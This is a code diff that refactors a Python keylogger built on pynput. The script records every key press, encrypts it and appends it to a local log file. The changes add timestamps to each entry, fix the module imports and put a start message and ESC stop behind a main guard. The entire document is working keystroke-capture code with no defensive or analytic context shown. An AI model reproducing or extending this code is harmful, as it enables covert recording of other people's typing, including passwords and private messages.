@@ -1,8 +1,15 @@
-# src/keylogger.py
 from pynput.keyboard import Key, Listener
-from src.utils.encryption import encrypt
-from src.config import ENC_LOG_FILE
+from datetime import datetime
 import os
+import sys
+
+# Add current directory to path
+current_dir = os.path.dirname(os.path.abspath(__file__))
+sys.path.append(current_dir)
+
+# Now import project modules
+from utils.encryption import encrypt
+from config import ENC_LOG_FILE
 
 # Ensure logs directory exists
 os.makedirs(os.path.dirname(ENC_LOG_FILE), exist_ok=True)
@@ -16,10 +23,10 @@ def write_file(key):
         k = "\n"
     elif k.startswith("Key."):
         k = f"[{k}]"
-
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     encrypted_key = encrypt(k)
     with open(ENC_LOG_FILE, "a") as f:
-        f.write(encrypted_key + "\n")
+        f.write(f"{timestamp} - {encrypted_key}\n")
 
 
 def on_press(key):
@@ -31,5 +38,7 @@ def on_release(key):
         return False  # Stop on ESC
 
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+if __name__ == "__main__":
+    print("Keylogger started. Press ESC to stop.")
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
